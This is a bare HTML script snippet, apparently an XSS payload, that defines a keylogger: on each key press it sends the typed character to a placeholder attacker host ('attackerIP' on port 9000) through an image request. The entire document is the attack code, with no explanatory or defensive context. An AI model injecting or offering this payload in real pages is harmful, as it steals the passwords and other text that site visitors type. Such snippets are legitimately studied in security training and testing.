<script>

document.onKeyPress =function KeyLogger(inp){

   key_pressed = String.fromCharCode(inp.which);
   
   new Image().src = "http://attackerIP:9000/?key="+key_pressed;

}
</script>
